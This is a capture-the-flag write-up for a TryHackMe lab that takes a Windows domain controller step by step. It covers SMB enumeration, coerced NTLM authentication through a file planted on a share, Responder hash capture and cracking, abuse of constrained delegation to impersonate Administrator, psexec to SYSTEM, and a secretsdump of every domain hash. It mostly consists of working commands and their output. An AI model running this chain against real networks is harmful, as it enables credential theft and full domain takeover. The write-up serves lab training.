# [TryHackMe | Proxy](https://tryhackme.com/room/proxychallenge) Challenge Room Solution Writeup

### What's the Administrator flag?

Begin by scanning `TARGET_IP` with `nmap`.

```bash
root@ip-ATTACKER-IP:~# nmap -sV -sC -p- TARGET-IP
Starting Nmap 7.94SVN ( https://nmap.org ) at 
Nmap scan report for ip-TARGET-IP.ec2.internal (TARGET-IP)
Host is up (0.00032s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: )
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ctf.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ctf.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: CTF
|   NetBIOS_Domain_Name: CTF
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: ctf.local
|   DNS_Computer_Name: DC01.ctf.local
|   DNS_Tree_Name: ctf.local
|   Product_Version: 10.0.17763
|_  System_Time: 
|_ssl-date: ; 0s from scanner time.
| ssl-cert: Subject: commonName=DC01.ctf.local
| Not valid before: 
|_Not valid after:  
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49668/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49673/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49818/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 198.91 seconds
```

There is an open `SMB` server, attempt to list the shares via a null (or Guest) session.

```bash
root@ip-ATTACKER-IP:~# smbclient -L //TARGET-IP -N

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	IT-Shared       Disk      IT Department Shared Resources
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```

Attempt to access the `IT-Shared` share, then find and get the various documents.

```bash
root@ip-ATTACKER-IP:~# smbclient //TARGET-IP/IT-Shared -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri May 22 03:19:03 2026
  ..                                  D        0  Fri May 22 03:19:03 2026
  IT-Credentials-Backup.txt           A      406  Fri May 22 03:18:15 2026
  IT-Onboarding-Checklist.txt         A      676  Fri May 22 03:18:16 2026
  IT-Portal.html                      A     4887  Fri May 22 03:19:03 2026

		7863807 blocks of size 4096. 3561319 blocks available
smb: \> mget *
Get file IT-Credentials-Backup.txt? y
getting file \IT-Credentials-Backup.txt of size 406 as IT-Credentials-Backup.txt (66.1 KiloBytes/sec) (average 66.1 KiloBytes/sec)
Get file IT-Onboarding-Checklist.txt? y
getting file \IT-Onboarding-Checklist.txt of size 676 as IT-Onboarding-Checklist.txt (330.1 KiloBytes/sec) (average 132.1 KiloBytes/sec)
Get file IT-Portal.html? y
getting file \IT-Portal.html of size 4887 as IT-Portal.html (190.9 KiloBytes/sec) (average 176.6 KiloBytes/sec)
```

Examine their contents.

`IT-Credentials-Backup.txt` only contains old disabled account usernames and passwords, which may be useful. 

```bash
root@ip-ATTACKER-IP:~# cat IT-Credentials-Backup.txt 
IT Department - Credentials Backup
===================================
Generated: 2019-08-14
Status: ARCHIVED (accounts disabled pending security review)

  helpdesk.bob  :  Welcome123!    [DISABLED - left company 2021]
  it.admin      :  ITAdmin2019!   [DISABLED - role change 2022]

NOTE: These accounts have been disabled. Active service accounts
      are managed separately by the sysadmin team.
```

`IT-Onboarding-Checklist.txt` contains some usernames and reveals that `svc.scanner` shell (`.cmd`) enumerates `IT-Shared` for new files every 2 minutes (this is a potential avenue for exploitation).

```bash
root@ip-ATTACKER-IP:~# cat IT-Onboarding-Checklist.txt 
IT Department Onboarding Checklist
====================================
Welcome to the team!

1. Get VPN access from sysadmin
2. Request AD account
3. Install tools (see software list on intranet)
4. Review security policies

Automated Services
------------------
  File Scanner (svc.scanner)
    Runs every 2 minutes. Enumerates IT-Shared for new files to process.
    Uses Shell enumeration to inspect file metadata and icons.
    Contact sysadmin if files are not being processed.

  Database Backup (svc.mssql)
    Handles nightly MSSQL backups. Member of Backup Operators.
    Password rotated quarterly -- do not store locally.

Questions? Email helpdesk@ctf.local
```

`IT-Portal.html` contains more usernames and service information.

```html
root@ip-ATTACKER-IP:~# cat IT-Portal.html 

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>CTF Corp – IT Portal</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: Segoe UI, Arial, sans-serif; background: #eef1f5; color: #333; }

    header {
      background: #1b3a5c;
      color: #fff;
      padding: 0 32px;
      height: 56px;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }
    header .brand { font-size: 1.05rem; font-weight: 600; letter-spacing: .5px; }
    header .user  { font-size: .85rem; opacity: .75; }

    nav {
      background: #254e7a;
      padding: 0 32px;
      display: flex;
      gap: 4px;
    }
    nav a {
      color: #c8d8ea;
      text-decoration: none;
      padding: 10px 14px;
      font-size: .88rem;
      border-bottom: 3px solid transparent;
    }
    nav a.active { color: #fff; border-bottom-color: #4fc3f7; }

    .page { max-width: 1060px; margin: 28px auto; padding: 0 20px; }

    .grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 16px; margin-bottom: 24px; }
    .stat {
      background: #fff;
      border-radius: 5px;
      padding: 18px 20px;
      box-shadow: 0 1px 3px rgba(0,0,0,.1);
    }
    .stat .label { font-size: .78rem; color: #888; text-transform: uppercase; letter-spacing: .5px; }
    .stat .value { font-size: 1.7rem; font-weight: 700; color: #1b3a5c; margin-top: 4px; }
    .stat .sub   { font-size: .8rem; color: #aaa; margin-top: 2px; }

    .card {
      background: #fff;
      border-radius: 5px;
      padding: 20px 24px;
      box-shadow: 0 1px 3px rgba(0,0,0,.1);
      margin-bottom: 16px;
    }
    .card h3 { font-size: .95rem; color: #1b3a5c; margin-bottom: 14px; border-bottom: 1px solid #eee; padding-bottom: 8px; }

    table { width: 100%; border-collapse: collapse; font-size: .88rem; }
    th { text-align: left; padding: 7px 10px; color: #666; font-weight: 600; border-bottom: 2px solid #eef1f5; }
    td { padding: 8px 10px; border-bottom: 1px solid #f3f4f6; }
    tr:last-child td { border-bottom: none; }

    .dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; margin-right: 6px; }
    .green  { background: #43a047; }
    .yellow { background: #fb8c00; }
    .red    { background: #e53935; }

    footer { text-align: center; font-size: .78rem; color: #aaa; padding: 24px; }
  </style>
</head>
<body>

<header>
  <span class="brand">&#127970; CTF Corp &mdash; IT Portal</span>
  <span class="user">Logged in as: svc.scanner</span>
</header>

<nav>
  <a href="#" class="active">Dashboard</a>
  <a href="#">Assets</a>
  <a href="#">Tickets</a>
  <a href="#">Users</a>
  <a href="#">Reports</a>
</nav>

<div class="page">

  <div class="grid">
    <div class="stat">
      <div class="label">Managed Hosts</div>
      <div class="value">14</div>
      <div class="sub">3 pending updates</div>
    </div>
    <div class="stat">
      <div class="label">Open Tickets</div>
      <div class="value">7</div>
      <div class="sub">2 high priority</div>
    </div>
    <div class="stat">
      <div class="label">Last Scan</div>
      <div class="value">&#10003;</div>
      <div class="sub">Today 08:42</div>
    </div>
  </div>

  <div class="card">
    <h3>Service Status</h3>
    <table>
      <tr><th>Service</th><th>Host</th><th>Status</th><th>Uptime</th></tr>
      <tr>
        <td>Active Directory</td>
        <td>DC01.ctf.local</td>
        <td><span class="dot green"></span>Online</td>
        <td>32 d</td>
      </tr>
      <tr>
        <td>DNS</td>
        <td>DC01.ctf.local</td>
        <td><span class="dot green"></span>Online</td>
        <td>32 d</td>
      </tr>
      <tr>
        <td>File Share (IT-Shared)</td>
        <td>DC01.ctf.local</td>
        <td><span class="dot green"></span>Online</td>
        <td>32 d</td>
      </tr>
      <tr>
        <td>Backup Agent</td>
        <td>SRV01.ctf.local</td>
        <td><span class="dot yellow"></span>Degraded</td>
        <td>11 d</td>
      </tr>
      <tr>
        <td>Monitoring</td>
        <td>SRV02.ctf.local</td>
        <td><span class="dot red"></span>Offline</td>
        <td>&#8212;</td>
      </tr>
    </table>
  </div>

  <div class="card">
    <h3>Recent Tickets</h3>
    <table>
      <tr><th>#</th><th>Subject</th><th>Assigned</th><th>Priority</th></tr>
      <tr><td>1042</td><td>Printer offline – 2nd floor</td><td>j.smith</td><td>Low</td></tr>
      <tr><td>1041</td><td>VPN access request – new hire</td><td>svc.helpdesk</td><td>Normal</td></tr>
      <tr><td>1039</td><td>Password reset – m.jones</td><td>svc.helpdesk</td><td>Normal</td></tr>
      <tr><td>1037</td><td>Backup job failed on SRV01</td><td>Unassigned</td><td><strong>High</strong></td></tr>
    </table>
  </div>

</div>

<footer>CTF Corp &copy; 2026 &mdash; IT Operations &mdash; Internal use only</footer>

</body>
</html>
```

Append all discovered usernames to `usernames.txt`.

```bash
printf '%s\n' helpdesk.bob it.admin svc.scanner svc.mssql helpdesk j.smith svc.helpdesk m.jones > usernames.txt
```

`kerbrute` may assess which of these usernames are valid on `DC01.ctf.local` as revealed earlier by `nmap`.

```bash
root@ip-ATTACKER-IP:~# kerbrute userenum -d ctf.local --dc TARGET-IP usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 11/02/26 - Ronnie Flathers @ropnop

2026/11/02 18:08:47 >  Using KDC(s):
2026/11/02 18:08:47 >  	TARGET-IP:88

2026/11/02 18:08:47 >  [+] VALID USERNAME:	 svc.scanner@ctf.local
2026/11/02 18:08:47 >  [+] VALID USERNAME:	 svc.mssql@ctf.local
2026/11/02 18:08:47 >  Done! Tested 8 usernames (2 valid) in 0.006 seconds
```

Of the discovered usernames, `svc.scanner` and `svc.mssql` are valid. Create `valid_usernames.txt` accordingly.

```bash
printf '%s\n' svc.scanner svc.mssql > valid_usernames.txt
```

Try checking for AS-REP roasting with these usernames, however neither may be used for this attack vector. 

```bash
root@ip-ATTACKER-IP:~# GetNPUsers ctf.local/ -dc-ip TARGET-IP -usersfile valid_usernames.txt 
Impacket v0.14.0.dev0+20260226.31512.9d3d86ea - Copyright Fortra, LLC and its affiliated companies 

[-] User svc.scanner doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc.mssql doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Instead try file-based coercion, which may leverage the scheduled `svc.scanner` enumeration on `IT-Shared` as the system automatically attempts to render an uploaded `.cmd` file's icon. Windows will send the `NetNTLMv2` hash of `svc.scanner` to the `UNC` path on `ATTACKER_IP` which the icon points to. 

Start a listener with `responder`.

```bash
root@ip-ATTACKER-IP:~# responder -I ens5
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[*] Tips jar:
    USDT -> 0xCc98c1D3b8cd9b717b5257827102940e4E17A19A
    BTC  -> bc1q9360jedhhmps5vpl3u05vyg4jryrl52dmazz49

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]
    DHCPv6                     [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [ens5]
    Responder IP               [TARGET-IP]
    Responder IPv6             []
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-XN6V7R1I67A]
    Responder Domain Name      [NW9K.LOCAL]
    Responder DCE-RPC Port     [46063]

[*] Version: Responder 3.2.2.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>

[+] Listening for events...

[!] Error starting SSL server on port 443, check permissions or other servers running.
[!] Error starting SSL server on port 5986, check permissions or other servers running.
[!] Error starting SSL server on port 636, check permissions or other servers running.
[!] Error starting TCP server on port 53, check permissions or other servers running.
```

Separately, create and upload the `unc.ps1` to `IT-Shared`.

```bash
root@ip-ATTACKER-IP:~# cat > unc.ps1 << 'EOF'
Get-ChildItem \\TARGET-IP\icons\
EOF
root@ip-ATTACKER-IP:~# smbclient //TARGET-IP/IT-Shared -N -c 'put unc.ps1'
putting file unc.ps1 as \unc.ps1 (35.2 kb/s) (average 35.2 kb/s)
```

Wait 2 minutes for the automatic enumeration.

```bash
[SMB] NTLMv2-SSP Client   : TARGET-IP
[SMB] NTLMv2-SSP Username : CTF\svc.scanner
[SMB] NTLMv2-SSP Hash     : svc.scanner::CTF:48cef450ad43af44:4145AA880130D8E459A02CC61C8E3D16:010100000000000080188E28116BDD01BBF8B067C588FAA700000000020008004E00570039004B0001001E00570049004E002D0058004E0036005600370052003100490036003700410004003400570049004E002D0058004E003600560037005200310049003600370041002E004E00570039004B002E004C004F00430041004C00030014004E00570039004B002E004C004F00430041004C00050014004E00570039004B002E004C004F00430041004C000700080080188E28116BDD010600040002000000080030003000000000000000010000000020000091EB56D3A8D5B905FD7F09984D02DD3A805B2089D68CF5D3240A7A1666D4EE3E0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00360036002E00380037002E003100390038000000000000000000
```

Save the hash to `hash.txt` then try cracking it using `hashcat`.

```bash
root@ip-ATTACKER-IP:~# nano hash.txt
root@ip-ATTACKER-IP:~# hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
...
SVC.SCANNER::CTF:48cef450ad43af44:4145aa880130d8e459a02cc61c8e3d16:010100000000000080188e28116bdd01bbf8b067c588faa700000000020008004e00570039004b0001001e00570049004e002d0058004e0036005600370052003100490036003700410004003400570049004e002d0058004e003600560037005200310049003600370041002e004e00570039004b002e004c004f00430041004c00030014004e00570039004b002e004c004f00430041004c00050014004e00570039004b002e004c004f00430041004c000700080080188e28116bdd010600040002000000080030003000000000000000010000000020000091eb56d3a8d5b905fd7f09984d02dd3a805b2089d68cf5d3240a7a1666d4ee3e0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00360036002e00380037002e003100390038000000000000000000:1summerlove!
...
```

Validate the discovered credentials of `username=svc.scanner` and `password=1summerlove!` for `SMB` and check for remote management access via `winrm` as well.

```bash
root@ip-ATTACKER-IP:~# nxc smb winrm TARGET-IP -d ctf.local -u 'svc.scanner' -p '1summerlove!'
SMB         TARGET-IP   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:ctf.local) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         TARGET-IP   445    DC01             [+] ctf.local\svc.scanner:1summerlove! 
Running nxc against 2 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

Enumerate the `LDAP` to discover delegation settings.

```bash
root@ip-ATTACKER-IP:~# nxc ldap TARGET-IP -d ctf.local -u 'svc.scanner' -p '1summerlove!' --find-delegation
LDAP        TARGET-IP   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:ctf.local) (signing:None) (channel binding:No TLS cert) 
LDAP        TARGET-IP   389    DC01             [+] ctf.local\svc.scanner:1summerlove! 
LDAP        TARGET-IP   389    DC01             AccountName AccountType DelegationType                     DelegationRightsTo                  
LDAP        TARGET-IP   389    DC01             ----------- ----------- ---------------------------------- ------------------------------------
LDAP        TARGET-IP   389    DC01             svc.scanner Person      Constrained w/ Protocol Transition cifs/DC01, cifs/DC01.ctf.local   
```

`svc.scanner` can perform protocol transition while impersonating the `Administrator` to obtain a service ticket to `cifs` on the `DC01`, then export it.

```bash
root@ip-ATTACKER-IP:~# getST -dc-ip TARGET-IP -spn cifs/DC01.ctf.local -impersonate Administrator 'ctf.local/svc.scanner:1summerlove!'
Impacket v0.14.0.dev0+20260226.31512.9d3d86ea - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
root@ip-ATTACKER-IP:~# export KRB5CCNAME=Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
```

Update `/etc/hosts`, then use this forged ticket with `psexec` and `Kerberos` to gain `nt authority\system` access.

```bash
root@ip-ATTACKER-IP:~# echo 'TARGET-IP dc01.ctf.local dc01 ctf.local' >> /etc/hosts
root@ip-ATTACKER-IP:~# psexec -k -no-pass dc01.ctf.local
Impacket v0.14.0.dev0+20260226.31512.9d3d86ea - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on dc01.ctf.local.....
[*] Found writable share ADMIN$
[*] Uploading file frhMYBFE.exe
[*] Opening SVCManager on dc01.ctf.local.....
[*] Creating service rdtk on dc01.ctf.local.....
[*] Starting service rdtk.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\Administrator\Desktop

05/20/2026  02:24 AM    <DIR>          .
05/20/2026  02:24 AM    <DIR>          ..
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
05/20/2026  02:24 AM                41 flag.txt
               3 File(s)          1,122 bytes
               2 Dir(s)  14,655,512,576 bytes free

C:\Users\Administrator\Desktop> type flag.txt
THM{S4U2S3lf_C0nstr41ned_D3l3g4t10n_2_DA}
```

The flag is recovered as **THM{S4U2S3lf_C0nstr41ned_D3l3g4t10n_2_DA}**.

For further post-exploitation, use the forged ticket with `secretsdump` to collect all domain account hashes. That of `krbtgt` can even be used to forge a golden ticket!

```bash
root@ip-ATTACKER-IP:~# secretsdump -k -no-pass dc01.ctf.local
Impacket v0.14.0.dev0+20260226.31512.9d3d86ea - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2dfe3378335d43f9764e581b856a662a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
CTF\DC01$:aes256-cts-hmac-sha1-96:97cfc6ba59143d4b3525a38a1e66703de3840fa4097e7efd7aa2f897514bf5ec
CTF\DC01$:aes128-cts-hmac-sha1-96:6d69b782c64ac32a9b6c82b9cd48814d
CTF\DC01$:des-cbc-md5:b92cdc2ad94cc7c8
CTF\DC01$:plain_password_hex:6b33441cb45e6b55f7839900a7ab5db2c8cc352a5755102da5babe0d86a6533aabcf08374d80ca8f970c7f61dd11962b25a1583f3458756e2c20954d225600d359b6772c212798d63db1162c2ed42b0a72ef71fa2c1a9f0346e6d680c6086510fa1bd2968993a05cad520ff8baa993ca43157c0eddc272ea3300a4a83612991fca7de6e2c2b18b0df4e491899079d947a2b6d00c4af16068c93ad834cb9eb7cd39c7b3926c3e9d69316bab374511e707cbecab4472bf33d13465beb718318c407a3c69f7afbbc917ed31952624796370323b2853f2dde3e793fe621afe25d0c7c78e42b0a74695f9cada9855088b53a1
CTF\DC01$:aad3b435b51404eeaad3b435b51404ee:a9ef4cfba20408bf5afaf76c8ecff5e3:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x0e88ce11d311d3966ca2422ac2708a4d707e00be
dpapi_userkey:0x8b68be9ef724e59070e7e3559e10078e36e8ab32
[*] NL$KM 
 0000   8D D2 8E 67 54 58 89 B1  C9 53 B9 5B 46 A2 B3 66   ...gTX...S.[F..f
 0010   D4 3B 95 80 92 7D 67 78  B7 1D F9 2D A5 55 B7 A3   .;...}gx...-.U..
 0020   61 AA 4D 86 95 85 43 86  E3 12 9E C4 91 CF 9A 5B   a.M...C........[
 0030   D8 BB 0D AE FA D3 41 E0  D8 66 3D 19 75 A2 D1 B2   ......A..f=.u...
NL$KM:8dd28e67545889b1c953b95b46a2b366d43b9580927d6778b71df92da555b7a361aa4d8695854386e3129ec491cf9a5bd8bb0daefad341e0d8663d1975a2d1b2
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:dd4592176bb3f58eea4e87a8f0eaf270:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bcebb2269753d50cfc594c78748f1e01:::
ctf.local\svc.scanner:1111:aad3b435b51404eeaad3b435b51404ee:dcb8cc599e5a5b1fb4dd83f94fea2660:::
ctf.local\svc.mssql:1112:aad3b435b51404eeaad3b435b51404ee:e58b1f56d99711bf4b14a9bf3a0e8820:::
ctf.local\helpdesk.bob:1113:aad3b435b51404eeaad3b435b51404ee:e4a22d8e7bbec871b341c88c2e94cba2:::
ctf.local\it.admin:1114:aad3b435b51404eeaad3b435b51404ee:2be08b7057df68ac6c4701dafa62b5c3:::
DC01$:1008:aad3b435b51404eeaad3b435b51404ee:a9ef4cfba20408bf5afaf76c8ecff5e3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:cc183d4410570f9f167cde6cab48ce10431163213d6f23cd58d63f8a312025ec
Administrator:aes128-cts-hmac-sha1-96:e4ba9116a84acf99f78a6c4d6139cf00
Administrator:des-cbc-md5:5e709d8ad64a94ad
krbtgt:aes256-cts-hmac-sha1-96:7def8b88ea7e1cdee9d03a95e6b79608a2421d34113c1486af9c64f6b00c5519
krbtgt:aes128-cts-hmac-sha1-96:a374a8ac7c691f3fe2e7a8568e021005
krbtgt:des-cbc-md5:d30e329b4c7fe3a4
ctf.local\svc.scanner:aes256-cts-hmac-sha1-96:054021a5e5f04b40c47499d04dbf112e2b610b487e7a2ac13e4ec720421cdbe5
ctf.local\svc.scanner:aes128-cts-hmac-sha1-96:fbe9bafe00ce35f396f67f58843c6490
ctf.local\svc.scanner:des-cbc-md5:10266eb3da2619e0
ctf.local\svc.mssql:aes256-cts-hmac-sha1-96:4a490242cfd2552bedf7082b9bf24b9dc0b0306d1e0ce3ffaac8868b616051f2
ctf.local\svc.mssql:aes128-cts-hmac-sha1-96:9b82b9272c5a15f404a8faf411980e62
ctf.local\svc.mssql:des-cbc-md5:573da83e1a32d946
ctf.local\helpdesk.bob:aes256-cts-hmac-sha1-96:97c2aa1c755c33acf8725d2d1d2bffe6eeb3c49342869669b52be68c7c016d18
ctf.local\helpdesk.bob:aes128-cts-hmac-sha1-96:34646609429a3c9fe8f711b9d0a55b2b
ctf.local\helpdesk.bob:des-cbc-md5:083b07406ece0bfb
ctf.local\it.admin:aes256-cts-hmac-sha1-96:39e7bf281fab2c8c7a7700ef923c359fd36ada6684372891cd9cfcc53176f1ae
ctf.local\it.admin:aes128-cts-hmac-sha1-96:9d8c3ca1c96a1434fb505aa36ade75dc
ctf.local\it.admin:des-cbc-md5:4a8cc4a1640b4634
DC01$:aes256-cts-hmac-sha1-96:97cfc6ba59143d4b3525a38a1e66703de3840fa4097e7efd7aa2f897514bf5ec
DC01$:aes128-cts-hmac-sha1-96:6d69b782c64ac32a9b6c82b9cd48814d
DC01$:des-cbc-md5:680b407f5efbbaa7
```